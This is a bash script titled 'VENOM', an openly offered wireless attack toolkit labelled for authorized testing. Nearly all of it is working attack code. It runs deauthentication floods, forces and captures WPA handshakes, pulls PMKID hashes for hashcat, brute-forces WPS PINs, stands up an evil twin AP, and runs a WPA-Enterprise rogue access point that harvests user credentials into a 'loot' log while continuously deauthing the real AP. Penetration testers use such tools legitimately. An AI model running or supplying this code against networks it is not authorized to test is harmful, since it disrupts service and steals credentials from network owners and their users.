#!/bin/bash
# Title: VENOM - Wireless Pentesting Toolkit
# Author: sinX (Enhanced)
# Description: Wireless pentesting tool - credential harvesting, deauth,
#              handshake capture, PMKID, evil twin, WPS, WPA-Enterprise rogue AP.
# Version: 3.0
#
# AUTHORIZED SECURITY TESTING ONLY

# ============================================
# CONFIGURATION & THEME
# ============================================

WIFI_IFACE=""
PHY_DEVICE=""
MONITOR_IFACE=""
TARGET_BSSID=""
TARGET_SSID=""
TARGET_CHANNEL=""
LOOT_DIR="./venom_loot"
CONFIG_FILE="./venom.conf"
TEMP_DIR="/tmp/venom"
WEBUI_PID=""

C_BR_GREEN='\033[1;32m'
C_GREEN='\033[0;32m'
C_GRAY='\033[0;37m'
C_WARN='\033[1;31m'
C_BLUE='\033[0;36m'
C_NC='\033[0m'

# ============================================
# UTILITY & LOGGING
# ============================================

log() {
    local color_name; color_name=$(echo "$1" | awk '{print toupper($0)}')
    local msg="$2"; [ -z "$msg" ] && msg="$1"
    local color_var_name=""
    case "$color_name" in
        "GREEN")    color_var_name="C_GREEN" ;;
        "BR_GREEN") color_var_name="C_BR_GREEN" ;;
        "GRAY")     color_var_name="C_GRAY" ;;
        "WARN")     color_var_name="C_WARN" ;;
        "BLUE")     color_var_name="C_BLUE" ;;
        *) printf "%s\n" "$msg"; return ;;
    esac
    printf "${!color_var_name}%s${C_NC}\n" "$msg"
}

log_file() {
    mkdir -p "$LOOT_DIR"
    local log_path="$LOOT_DIR/venom_$(date +%Y%m%d).log"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$log_path"
}

press_enter() {
    log green "\nPress [Enter] to continue..."
    read -r
}

show_help() {
    cat << EOF
Usage: $0 [OPTIONS]

Options:
  -i <iface>   Set wireless interface
  -l <dir>     Set loot directory (default: ./venom_loot)
  -c <file>    Load config file
  -h           Show this help

Examples:
  $0 -i wlan0
  $0 -i wlan0 -l /tmp/loot
EOF
    exit 0
}

# ============================================
# CONFIGURATION MANAGEMENT
# ============================================

save_config() {
    cat > "$CONFIG_FILE" << EOF
WIFI_IFACE="$WIFI_IFACE"
PHY_DEVICE="$PHY_DEVICE"
MONITOR_IFACE="$MONITOR_IFACE"
LOOT_DIR="$LOOT_DIR"
TARGET_BSSID="$TARGET_BSSID"
TARGET_SSID="$TARGET_SSID"
TARGET_CHANNEL="$TARGET_CHANNEL"
EOF
    log green "Config saved to $CONFIG_FILE"
    log_file "Config saved to $CONFIG_FILE"
    press_enter
}

load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        # shellcheck source=/dev/null
        source "$CONFIG_FILE"
        log green "Config loaded from $CONFIG_FILE"
        log_file "Config loaded from $CONFIG_FILE"
    else
        log warn "No config file found at $CONFIG_FILE"
    fi
    press_enter
}

# ============================================
# DEPENDENCY CHECK
# ============================================

check_deps() {
    local missing=""
    log blue "Checking dependencies..."
    for cmd in hostapd iw tcpdump openssl aireplay-ng airodump-ng airmon-ng; do
        if ! command -v "$cmd" >/dev/null 2>&1; then missing="$missing $cmd"; fi
    done
    if [ -n "$missing" ]; then
        log warn "Missing required dependencies:$missing"
        log gray "Install: sudo apt-get install hostapd aircrack-ng tcpdump openssl iw"
        return 1
    fi
    local optional_missing=""
    for cmd in reaver bully hcxdumptool hcxpcapngtool hostapd-wpe; do
        if ! command -v "$cmd" >/dev/null 2>&1; then optional_missing="$optional_missing $cmd"; fi
    done
    [ -n "$optional_missing" ] && log blue "Optional (some features limited):$optional_missing"
    log green "Core dependencies OK."
}

# ============================================
# INTERFACE & MONITOR MODE
# ============================================

enable_monitor_mode() {
    if [ -z "$WIFI_IFACE" ]; then log warn "Select an interface first!"; return 1; fi
    if [ -n "$MONITOR_IFACE" ] && iw dev "$MONITOR_IFACE" info >/dev/null 2>&1; then
        log blue "$MONITOR_IFACE already active."; return 0
    fi
    log blue "Enabling monitor mode on $WIFI_IFACE..."
    local potential_mon="${WIFI_IFACE}mon"
    if command -v airmon-ng >/dev/null 2>&1; then
        airmon-ng check kill >/dev/null 2>&1
        airmon-ng start "$WIFI_IFACE" >/dev/null 2>&1
        if iw dev "$potential_mon" info >/dev/null 2>&1; then
            MONITOR_IFACE="$potential_mon"
        elif iw dev "$WIFI_IFACE" info 2>/dev/null | grep -q "type monitor"; then
            MONITOR_IFACE="$WIFI_IFACE"
        fi
    else
        ip link set "$WIFI_IFACE" down
        iw dev "$WIFI_IFACE" set type monitor
        ip link set "$WIFI_IFACE" up
        MONITOR_IFACE="$WIFI_IFACE"
    fi
    if [ -n "$MONITOR_IFACE" ] && iw dev "$MONITOR_IFACE" info 2>/dev/null | grep -q "type monitor"; then
        log green "Monitor mode enabled on $MONITOR_IFACE"
        log_file "Monitor mode enabled: $MONITOR_IFACE"
        return 0
    fi
    log warn "Failed to enable monitor mode."
    MONITOR_IFACE=""
    return 1
}

disable_monitor_mode() {
    local iface="${MONITOR_IFACE:-${WIFI_IFACE}mon}"
    if [ -z "$MONITOR_IFACE" ] && ! iw dev "$iface" info >/dev/null 2>&1; then
        log blue "Monitor mode not active."; return
    fi
    log blue "Disabling monitor mode on $iface..."
    if command -v airmon-ng >/dev/null 2>&1; then
        airmon-ng stop "$iface" >/dev/null 2>&1
    else
        ip link set "$iface" down
        iw dev "$iface" set type managed
        ip link set "$iface" up
    fi
    command -v systemctl >/dev/null 2>&1 && systemctl restart NetworkManager >/dev/null 2>&1
    log green "Monitor mode disabled."
    log_file "Monitor mode disabled"
    MONITOR_IFACE=""
}

# ============================================
# VENDOR LOOKUP
# ============================================

vendor_lookup() {
    local bssid="$1"
    local oui; oui=$(echo "$bssid" | tr -d ':' | tr '[:lower:]' '[:upper:]' | cut -c1-6)
    for db in /usr/share/ieee-data/oui.txt /var/lib/ieee-data/oui.txt; do
        if [ -f "$db" ]; then
            local vendor; vendor=$(grep -i "^$oui" "$db" | awk '{print $3}' | head -1)
            echo "${vendor:-Unknown}"; return
        fi
    done
    echo "Unknown"
}

# ============================================
# INTERFACE SELECTION
# ============================================

select_interface_menu() {
    mapfile -t interfaces < <(iw dev | grep -o 'Interface .*' | cut -d' ' -f2)
    [ ${#interfaces[@]} -eq 0 ] && { log warn "No wireless interfaces found."; press_enter; return; }
    clear; log br_green "Select Wireless Interface"; log gray "---------------------------"
    for i in "${!interfaces[@]}"; do
        local phy; phy=$(iw dev "${interfaces[i]}" info 2>/dev/null | grep -o 'wiphy .*' | cut -d' ' -f2)
        printf "${C_GREEN}%d) ${C_GRAY}%s (phy%s)${C_NC}\n" "$((i+1))" "${interfaces[i]}" "$phy"
    done
    log gray "---------------------------"
    read -rp "$(log green 'Enter your choice: ' && printf '')" choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#interfaces[@]}" ]; then
        WIFI_IFACE="${interfaces[$((choice-1))]}"
        PHY_DEVICE="phy$(iw dev "$WIFI_IFACE" info 2>/dev/null | grep -o 'wiphy .*' | cut -d' ' -f2)"
        log green "Selected: $WIFI_IFACE ($PHY_DEVICE)"
        log_file "Interface selected: $WIFI_IFACE"
    else
        log warn "Invalid selection."
    fi
    press_enter
}

# ============================================
# SCAN & SELECT TARGET
# ============================================

scan_and_select_target() {
    if [ -z "$WIFI_IFACE" ]; then log warn "Select an interface first!"; return 1; fi
    clear; log br_green "Scanning for networks on $WIFI_IFACE..."
    ip link set dev "$WIFI_IFACE" up 2>/dev/null
    local scan_output; scan_output=$(iw dev "$WIFI_IFACE" scan 2>/dev/null)

    mapfile -t bssids   < <(echo "$scan_output" | grep -o 'BSS [0-9a-f:]*' | awk '{print $2}')
    mapfile -t ssids    < <(echo "$scan_output" | grep 'SSID: ' | sed 's/.*SSID: //')
    mapfile -t channels < <(echo "$scan_output" | grep 'DS Parameter set: channel' | awk '{print $5}')
    mapfile -t signals  < <(echo "$scan_output" | grep 'signal:' | awk '{print $2}')

    log gray "-------------------------------------------------------------------------------"
    printf "${C_GREEN}%s  %-22s %-20s %-5s %-10s %s${C_NC}\n" "  " "SSID" "BSSID" "CH" "SIGNAL" "VENDOR"
    log gray "-------------------------------------------------------------------------------"
    for i in "${!bssids[@]}"; do
        local vendor; vendor=$(vendor_lookup "${bssids[i]}")
        printf "${C_GREEN}%2d) ${C_GRAY}%-22s %-20s %-5s %-10s %s${C_NC}\n" \
            "$((i+1))" "${ssids[i]:-<hidden>}" "${bssids[i]}" \
            "${channels[i]:-?}" "${signals[i]:-?} dBm" "$vendor"
    done
    log gray "-------------------------------------------------------------------------------"
    read -rp "$(log green 'Select target AP: ' && printf '')" choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#bssids[@]}" ]; then
        local idx=$((choice-1))
        TARGET_BSSID="${bssids[$idx]}"
        TARGET_CHANNEL="${channels[$idx]}"
        TARGET_SSID="${ssids[$idx]:-<hidden>}"
        log green "Target: $TARGET_SSID ($TARGET_BSSID) CH $TARGET_CHANNEL"
        log_file "Target selected: $TARGET_SSID ($TARGET_BSSID) CH:$TARGET_CHANNEL"
        return 0
    fi
    log warn "Invalid selection."; return 1
}

# ============================================
# CHANNEL-HOPPING SCAN
# ============================================

channel_hop_scan() {
    if [ -z "$WIFI_IFACE" ]; then log warn "Select an interface first!"; return 1; fi
    local orig_mon=$MONITOR_IFACE
    if ! enable_monitor_mode; then press_enter; return; fi
    mkdir -p "$LOOT_DIR"
    local out="$LOOT_DIR/scan_$(date +%Y%m%d_%H%M%S)"
    log blue "Channel-hopping scan started. Results -> ${out}-01.csv"
    log blue "Press Ctrl+C to stop."
    log_file "Channel-hop scan: $out"
    trap "log blue '\nScan stopped.'; trap - INT" INT
    airodump-ng --write "$out" --output-format csv "$MONITOR_IFACE"
    trap - INT
    [ -z "$orig_mon" ] && disable_monitor_mode
    press_enter
}

# ============================================
# CLIENT ENUMERATION
# ============================================

enumerate_clients() {
    [ -z "$TARGET_BSSID" ] && { scan_and_select_target || { press_enter; return; }; }
    local orig_mon=$MONITOR_IFACE
    if ! enable_monitor_mode; then press_enter; return; fi
    mkdir -p "$LOOT_DIR"
    local out="$LOOT_DIR/clients_$(date +%Y%m%d_%H%M%S)"
    log blue "Enumerating clients on $TARGET_SSID for 30 seconds..."
    log_file "Client enum: $TARGET_BSSID -> $out"
    iw dev "$MONITOR_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null
    timeout 30 airodump-ng --bssid "$TARGET_BSSID" --channel "$TARGET_CHANNEL" \
        --write "$out" --output-format csv "$MONITOR_IFACE" 2>/dev/null
    if [ -f "${out}-01.csv" ]; then
        log br_green "\nAssociated Clients:"
        log gray "-----------------------------------------------"
        awk -F',' 'f && /([0-9A-Fa-f]{2}:){5}/ {
            gsub(/ /,"",$1); printf "  MAC: %-20s First: %s\n", $1, $3
        } /Station MAC/{f=1}' "${out}-01.csv"
        log_file "Client enum complete: ${out}-01.csv"
    else
        log warn "No client data captured."
    fi
    [ -z "$orig_mon" ] && disable_monitor_mode
    press_enter
}

# ============================================
# DEAUTH ATTACK
# ============================================

deauth_attack_menu() {
    [ -z "$TARGET_BSSID" ] && { scan_and_select_target || { press_enter; return; }; }
    read -rp "$(log green 'Packets (0=continuous) [64]: ' && printf '')" packets
    packets=${packets:-64}
    read -rp "$(log green 'Target client MAC (blank=broadcast): ' && printf '')" client_mac
    local orig_mon=$MONITOR_IFACE
    if ! enable_monitor_mode; then press_enter; return; fi
    iw dev "$MONITOR_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null
    local cmd="aireplay-ng --deauth $packets -a $TARGET_BSSID"
    [ -n "$client_mac" ] && cmd="$cmd -c $client_mac"
    cmd="$cmd $MONITOR_IFACE"
    log warn "Deauth attack on $TARGET_BSSID. Ctrl+C to stop."
    log_file "Deauth: target=$TARGET_BSSID packets=$packets client=${client_mac:-broadcast}"
    trap "log blue '\nStopped.'; trap - INT; return" INT
    eval "$cmd"
    trap - INT
    [ -z "$orig_mon" ] && disable_monitor_mode
    press_enter
}

# ============================================
# WPA HANDSHAKE CAPTURE
# ============================================

capture_handshake() {
    [ -z "$TARGET_BSSID" ] && { scan_and_select_target || { press_enter; return; }; }
    local orig_mon=$MONITOR_IFACE
    if ! enable_monitor_mode; then press_enter; return; fi
    mkdir -p "$LOOT_DIR"
    local safe_ssid="${TARGET_SSID//[^a-zA-Z0-9]/_}"
    local cap="$LOOT_DIR/hs_${safe_ssid}_$(date +%Y%m%d_%H%M%S)"
    log blue "Capturing handshake for $TARGET_SSID ($TARGET_BSSID) CH $TARGET_CHANNEL"
    log blue "Sending deauths to force reconnection. Ctrl+C to stop."
    log_file "Handshake capture: $TARGET_SSID ($TARGET_BSSID) -> $cap"
    airodump-ng --bssid "$TARGET_BSSID" --channel "$TARGET_CHANNEL" \
        --write "$cap" "$MONITOR_IFACE" &
    local dump_pid=$!
    sleep 5
    aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MONITOR_IFACE" >/dev/null 2>&1 &
    trap "kill $dump_pid 2>/dev/null; log blue '\nCapture stopped.'; trap - INT" INT
    while kill -0 $dump_pid 2>/dev/null; do
        sleep 5
        if [ -f "${cap}-01.cap" ] && aircrack-ng "${cap}-01.cap" 2>/dev/null | grep -q "WPA handshake"; then
            log green "Handshake captured! -> ${cap}-01.cap"
            log_file "Handshake captured: ${cap}-01.cap"
            kill $dump_pid 2>/dev/null
            break
        fi
    done
    trap - INT
    [ -f "${cap}-01.cap" ] && log gray "Crack: aircrack-ng -w <wordlist> ${cap}-01.cap"
    [ -z "$orig_mon" ] && disable_monitor_mode
    press_enter
}

# ============================================
# PMKID ATTACK
# ============================================

pmkid_attack() {
    if ! command -v hcxdumptool >/dev/null 2>&1; then
        log warn "hcxdumptool not found. Install: sudo apt-get install hcxdumptool hcxtools"
        press_enter; return
    fi
    [ -z "$TARGET_BSSID" ] && { scan_and_select_target || { press_enter; return; }; }
    local orig_mon=$MONITOR_IFACE
    if ! enable_monitor_mode; then press_enter; return; fi
    mkdir -p "$LOOT_DIR"
    local safe_ssid="${TARGET_SSID//[^a-zA-Z0-9]/_}"
    local pcap="$LOOT_DIR/pmkid_${safe_ssid}_$(date +%Y%m%d_%H%M%S).pcapng"
    local hashfile="${pcap%.pcapng}.hash"
    local filter="/tmp/venom_bssid_filter.txt"
    echo "${TARGET_BSSID//:/}" > "$filter"
    log blue "PMKID attack on $TARGET_SSID ($TARGET_BSSID) - 60 second capture..."
    log_file "PMKID attack: $TARGET_SSID ($TARGET_BSSID) -> $pcap"
    trap "log blue '\nCapture stopped.'; trap - INT" INT
    timeout 60 hcxdumptool -i "$MONITOR_IFACE" --filterlist_ap="$filter" \
        --filtermode=2 -o "$pcap" 2>/dev/null
    trap - INT
    if [ -f "$pcap" ]; then
        if command -v hcxpcapngtool >/dev/null 2>&1; then
            hcxpcapngtool -o "$hashfile" "$pcap" 2>/dev/null
            log green "Hash -> $hashfile"
            log gray "Crack: hashcat -m 22000 $hashfile <wordlist>"
            log_file "PMKID hash: $hashfile"
        elif command -v hcxpcaptool >/dev/null 2>&1; then
            hcxpcaptool -z "$hashfile" "$pcap" 2>/dev/null
            log green "Hash -> $hashfile"
            log gray "Crack: hashcat -m 16800 $hashfile <wordlist>"
            log_file "PMKID hash: $hashfile"
        else
            log warn "hcxpcapngtool/hcxpcaptool not found. Raw capture: $pcap"
        fi
    else
        log warn "No PMKID captured."
    fi
    [ -z "$orig_mon" ] && disable_monitor_mode
    press_enter
}

# ============================================
# EVIL TWIN AP
# ============================================

evil_twin_attack() {
    [ -z "$TARGET_BSSID" ] && { scan_and_select_target || { press_enter; return; }; }
    if [ -z "$WIFI_IFACE" ]; then log warn "Select an interface first!"; press_enter; return; fi
    mkdir -p "$TEMP_DIR" "$LOOT_DIR"
    local conf="$TEMP_DIR/evil_twin.conf"
    cat > "$conf" << EOF
interface=$WIFI_IFACE
driver=nl80211
ssid=$TARGET_SSID
channel=${TARGET_CHANNEL:-6}
hw_mode=g
ignore_broadcast_ssid=0
EOF
    log warn "Starting Evil Twin: '$TARGET_SSID' CH ${TARGET_CHANNEL:-6}"
    log blue "Deauthing clients from real AP ($TARGET_BSSID) in background..."
    log_file "Evil Twin: SSID=$TARGET_SSID target=$TARGET_BSSID"
    local deauth_pid=""
    if enable_monitor_mode 2>/dev/null; then
        aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONITOR_IFACE" >/dev/null 2>&1 &
        deauth_pid=$!
    fi
    log gray "Press Ctrl+C to stop."
    trap "[ -n '$deauth_pid' ] && kill $deauth_pid 2>/dev/null; log blue '\nEvil Twin stopped.'; trap - INT" INT
    hostapd "$conf"
    trap - INT
    [ -n "$deauth_pid" ] && kill $deauth_pid 2>/dev/null
    press_enter
}

# ============================================
# WPS ATTACK
# ============================================

wps_attack() {
    [ -z "$TARGET_BSSID" ] && { scan_and_select_target || { press_enter; return; }; }
    local tool=""
    if command -v reaver >/dev/null 2>&1; then tool="reaver"
    elif command -v bully >/dev/null 2>&1; then tool="bully"
    else
        log warn "Neither reaver nor bully found. Install: sudo apt-get install reaver"
        press_enter; return
    fi
    local orig_mon=$MONITOR_IFACE
    if ! enable_monitor_mode; then press_enter; return; fi
    iw dev "$MONITOR_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null
    mkdir -p "$LOOT_DIR"
    local safe_ssid="${TARGET_SSID//[^a-zA-Z0-9]/_}"
    local wps_log="$LOOT_DIR/wps_${safe_ssid}_$(date +%Y%m%d_%H%M%S).log"
    log blue "WPS PIN attack on $TARGET_SSID ($TARGET_BSSID) using $tool"
    log blue "This may take hours. Ctrl+C to stop."
    log_file "WPS attack: $TARGET_SSID ($TARGET_BSSID) tool=$tool log=$wps_log"
    trap "log blue '\nWPS attack stopped.'; trap - INT" INT
    if [ "$tool" = "reaver" ]; then
        reaver -i "$MONITOR_IFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" -vv -K 1 2>&1 | tee "$wps_log"
    else
        bully "$MONITOR_IFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" -v 3 2>&1 | tee "$wps_log"
    fi
    trap - INT
    log green "Log saved: $wps_log"
    [ -z "$orig_mon" ] && disable_monitor_mode
    press_enter
}

# ============================================
# VENOM ATTACK - WPA-ENTERPRISE ROGUE AP
# ============================================

start_venom_attack() {
    [ -z "$TARGET_BSSID" ] && { scan_and_select_target || { press_enter; return; }; }
    local hostapd_bin=""
    if command -v hostapd-wpe >/dev/null 2>&1; then
        hostapd_bin="hostapd-wpe"
    elif command -v hostapd >/dev/null 2>&1; then
        hostapd_bin="hostapd"
        log blue "hostapd-wpe not found, using hostapd (install hostapd-wpe for full cred capture)"
    else
        log warn "hostapd not found."; press_enter; return
    fi

    mkdir -p "$TEMP_DIR" "$LOOT_DIR"
    local cert_dir="$TEMP_DIR/certs"
    mkdir -p "$cert_dir"

    # Generate self-signed cert if needed
    if [ ! -f "$cert_dir/server.pem" ]; then
        log blue "Generating self-signed certificate..."
        openssl req -new -x509 -days 365 -nodes \
            -out "$cert_dir/server.pem" \
            -keyout "$cert_dir/server.key" \
            -subj "/C=US/ST=State/L=City/O=Corp/CN=radius.local" 2>/dev/null
        openssl dhparam -out "$cert_dir/dh" 1024 2>/dev/null
        cp "$cert_dir/server.pem" "$cert_dir/ca.pem"
    fi

    local cred_log="$LOOT_DIR/venom_creds_$(date +%Y%m%d_%H%M%S).log"
    local conf="$TEMP_DIR/venom_wpe.conf"
    local hostapd_log="$TEMP_DIR/venom_hostapd.log"

    # EAP users file - supports PEAP, TTLS, TLS, MSCHAPv2
    cat > "$TEMP_DIR/eap_users" << EOF
*               PEAP,TTLS,TLS,MD5
"t"             TTLS-MSCHAPV2,TTLS-MSCHAP,TTLS-PAP,TTLS-CHAP,TTLS,MD5     "t" [2]
EOF

    # hostapd config
    cat > "$conf" << EOF
interface=$WIFI_IFACE
driver=nl80211
ssid=$TARGET_SSID
channel=${TARGET_CHANNEL:-6}
hw_mode=g
ieee8021x=1
eapol_version=2
eap_server=1
eap_user_file=$TEMP_DIR/eap_users
ca_cert=$cert_dir/ca.pem
server_cert=$cert_dir/server.pem
private_key=$cert_dir/server.key
dh_file=$cert_dir/dh
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
EOF
    # hostapd-wpe credential log
    [ "$hostapd_bin" = "hostapd-wpe" ] && echo "wpe_logfile=$cred_log" >> "$conf"

    log warn "Starting VENOM WPA-Enterprise Rogue AP: '$TARGET_SSID'"
    log blue "Real AP target: $TARGET_BSSID"
    log blue "Credentials -> $cred_log"
    log_file "VENOM attack: SSID=$TARGET_SSID target=$TARGET_BSSID creds=$cred_log"

    # Background deauth against real AP
    local deauth_pid=""
    if enable_monitor_mode 2>/dev/null; then
        aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONITOR_IFACE" >/dev/null 2>&1 &
        deauth_pid=$!
    fi

    touch "$cred_log"
    log br_green "\n--- Live Credential Feed (Ctrl+C to stop) ---"
    tail -f "$cred_log" &
    local tail_pid=$!

    trap "kill $tail_pid 2>/dev/null; [ -n '$deauth_pid' ] && kill $deauth_pid 2>/dev/null; log blue '\nVENOM stopped.'; trap - INT" INT
    "$hostapd_bin" "$conf" > "$hostapd_log" 2>&1
    trap - INT

    kill $tail_pid 2>/dev/null
    [ -n "$deauth_pid" ] && kill $deauth_pid 2>/dev/null
    log green "Cred log: $cred_log"
    log green "Hostapd log: $hostapd_log"
    press_enter
}

# ============================================
# WEB UI
# ============================================

launch_web_ui() {
    local script_dir
    script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    local webui_dir="$script_dir/webui"
    local app="$webui_dir/app.py"
    local port=8080

    if [ ! -f "$app" ]; then
        log warn "Web UI not found at $webui_dir"
        log gray "Expected: $app"
        press_enter; return
    fi

    if ! command -v python3 >/dev/null 2>&1; then
        log warn "python3 not found. Install: sudo apt-get install python3"
        press_enter; return
    fi

    if ! python3 -c "import flask" >/dev/null 2>&1; then
        log warn "Flask not installed."
        read -rp "$(log green 'Install Flask now? [y/N]: ' && printf '')" yn
        if [[ "$yn" =~ ^[Yy]$ ]]; then
            pip3 install flask
        else
            press_enter; return
        fi
    fi

    # Kill any existing instance on that port
    local existing_pid
    existing_pid=$(lsof -ti tcp:"$port" 2>/dev/null)
    if [ -n "$existing_pid" ]; then
        log blue "Stopping existing Web UI (PID $existing_pid)..."
        kill "$existing_pid" 2>/dev/null
        sleep 1
    fi

    log blue "Starting VENOM Web UI on port $port..."
    log_file "Web UI launched on port $port"

    FLASK_APP="$app" python3 -m flask run --host=0.0.0.0 --port="$port" \
        > "$LOOT_DIR/webui.log" 2>&1 &
    local web_pid=$!

    sleep 2
    if kill -0 "$web_pid" 2>/dev/null; then
        log green "Web UI running  ->  http://0.0.0.0:$port  (PID $web_pid)"
        log gray  "Log: $LOOT_DIR/webui.log"
        log gray  "Press Q in this menu to stop it, or kill PID $web_pid manually."
        # Store pid so we can clean up on exit
        WEBUI_PID=$web_pid
    else
        log warn "Web UI failed to start. Check $LOOT_DIR/webui.log"
    fi
    press_enter
}

stop_web_ui() {
    if [ -n "$WEBUI_PID" ] && kill -0 "$WEBUI_PID" 2>/dev/null; then
        kill "$WEBUI_PID" 2>/dev/null
        log blue "Web UI stopped (PID $WEBUI_PID)."
        WEBUI_PID=""
    else
        # Fallback: kill anything on 8080
        local pid; pid=$(lsof -ti tcp:8080 2>/dev/null)
        [ -n "$pid" ] && kill "$pid" 2>/dev/null && log blue "Web UI stopped."
    fi
}

# ============================================
# MAIN MENU
# ============================================

main_menu() {
    while true; do
        clear
        printf "${C_BR_GREEN}"
        echo " __   _____ _  _  ___  __  __"
        echo " \ \ / / __| \| |/ _ \|  \/  |"
        echo "  \ V /| _|| .\` | (_) | |\/| |"
        echo "   \_/ |___|_|\_|\___/|_|  |_|"
        printf "${C_GRAY}"
        echo "       Wireless Pentesting Toolkit v3.0"
        printf "\n"
        echo -e "  ${C_GREEN}Interface : ${C_GRAY}${WIFI_IFACE:-Not Set}"
        echo -e "  ${C_GREEN}Monitor   : ${C_GRAY}${MONITOR_IFACE:-No}"
        echo -e "  ${C_GREEN}Target    : ${C_GRAY}${TARGET_SSID:-Not Set}${TARGET_BSSID:+ ($TARGET_BSSID)}"
        echo -e "  ${C_GREEN}Loot Dir  : ${C_GRAY}${LOOT_DIR}${C_NC}"
        log gray "-------------------------------------------"
        log green "1) Select Wireless Interface"
        log green "2) Scan & Select Target"
        log green "3) Toggle Monitor Mode"
        log green "4) Channel-Hopping Scan"
        log green "5) Enumerate Clients"
        log gray "-------------------------------------------"
        log warn  "6) Deauthentication Attack"
        log warn  "7) Capture WPA Handshake"
        log warn  "8) PMKID Attack"
        log warn  "9) Evil Twin AP"
        log warn  "A) WPS PIN Attack"
        log warn  "V) VENOM Attack  (WPA-Enterprise)"
        log gray "-------------------------------------------"
        log green "S) Save Config"
        log green "L) Load Config"
        log blue  "W) Launch Web UI  ${WEBUI_PID:+(running PID $WEBUI_PID)}"
        log green "Q) Quit"
        read -rp "$(log green '\nChoice: ' && printf '')" choice
        case "$choice" in
            1) select_interface_menu ;;
            2) scan_and_select_target; press_enter ;;
            3) [ -n "$MONITOR_IFACE" ] && disable_monitor_mode || enable_monitor_mode; press_enter ;;
            4) channel_hop_scan ;;
            5) enumerate_clients ;;
            6) deauth_attack_menu ;;
            7) capture_handshake ;;
            8) pmkid_attack ;;
            9) evil_twin_attack ;;
            a|A) wps_attack ;;
            v|V) start_venom_attack ;;
            s|S) save_config ;;
            l|L) load_config ;;
            w|W) launch_web_ui ;;
            q|Q) break ;;
            *) log warn "Invalid choice." && sleep 1 ;;
        esac
    done
    [ -n "$MONITOR_IFACE" ] && disable_monitor_mode
    [ -n "$WEBUI_PID" ] && stop_web_ui
    log br_green "Exiting Venom. Stay safe."
}

# ============================================
# ENTRY POINT
# ============================================

while getopts "i:l:c:h" opt; do
    case $opt in
        i) WIFI_IFACE="$OPTARG" ;;
        l) LOOT_DIR="$OPTARG" ;;
        c) CONFIG_FILE="$OPTARG"; source "$CONFIG_FILE" 2>/dev/null ;;
        h) show_help ;;
        *) show_help ;;
    esac
done

mkdir -p "$LOOT_DIR" "$TEMP_DIR"

if [ "$EUID" -ne 0 ]; then log warn "Please run as root."; exit 1; fi
check_deps || exit 1
main_menu
exit 0
